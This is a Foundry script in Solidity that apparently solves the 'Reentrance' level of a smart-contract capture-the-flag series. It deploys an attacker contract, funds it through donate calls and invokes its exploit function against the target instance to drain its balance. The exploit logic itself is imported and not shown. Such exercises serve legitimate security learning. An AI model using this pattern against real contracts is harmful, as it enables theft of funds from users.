// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/10_reentrance.sol";
import "contracts/10_reentrance.sol";

contract AttackerReentranceScript is Script {
    Reentrance reentrance = Reentrance(payable(vm.envAddress("INSTANCE")));

    function run() external {
        vm.startBroadcast();

        AttackerReentrance attackerReentrance = new AttackerReentrance();

        reentrance.donate{value: 0.005 ether}(address(this));
        reentrance.donate{value: 0.001 ether}(address(attackerReentrance));

        console.log("Current attacker balance :", address(attackerReentrance).balance);

        attackerReentrance.exploit(address(reentrance));

        console.log("New attacker balance :", address(attackerReentrance).balance);

        vm.stopBroadcast();
    }
}
